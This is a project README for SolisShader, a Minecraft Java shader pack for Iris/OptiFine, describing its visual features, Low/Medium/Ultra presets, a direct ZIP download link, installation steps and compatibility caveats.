# SolisShader

SolisShader is a performance-aware Minecraft Java shader pack for the classic Iris/OptiFine GLSL pipeline. It aims for a cinematic look without defaulting to the most expensive effects.

## Visual features

- Soft PCF shadow-map filtering with quality presets.
- Minecraft lightmap-aware terrain shading and subtle warm color grading.
- Gentle vegetation wrap-lighting approximation.
- Animated water normal perturbation, optional screen-space reflections, and underwater caustic highlights.
- Altitude-aware distance fog, sky tinting, and screen-space sun shafts.
- Four-tap highlight bloom, ACES-style tonemapping, and a lightweight sky-light-informed exposure lift.
- Optional depth-of-field and camera-motion blur in the Ultra preset.

## Presets

- **Low:** minimal post-processing, SSR, DOF, and motion blur disabled for higher frame rates.
- **Medium:** 1024 shadow map, four-tap PCF, four-tap bloom, four volumetric taps, fog and caustics. SSR and blur remain off.
- **Ultra:** 2048 shadow map, nine-tap PCF, bounded 8-step shafts/SSR, DOF and motion blur. This preset costs more GPU time.

No fixed FPS can be guaranteed. GPU model alone does not determine performance; resolution, render distance, scene geometry, drivers, other mods, and Minecraft settings matter.

## Direct download

[**Download SolisShader.zip**](https://github.com/vhxLUAv2/SolisShader/raw/refs/heads/main/SolisShader.zip) directly from this repository. No GitHub Actions are required for downloading.

1. Download the ZIP file.
2. Keep it compressed and place it in the shaderpacks folder opened from Iris' Shader Packs screen.
3. Select SolisShader.

## Notes and compatibility

This pack uses the conventional `shaders/` layout and GLSL 330 compatibility shaders. Iris documents `composite`, `composite1`, and `final` as fullscreen post-processing programs. Some features are visual approximations: SSR only reflects objects visible in the current frame; the leaf/grass effect is not physically accurate subsurface scattering; exposure is an environment-light lift rather than histogram-based temporal exposure.

The source uses compile-time option switches so disabled effects can be removed from shader variants where supported. In-game rendering on a particular Iris/OptiFine version and GPU still needs to be verified.
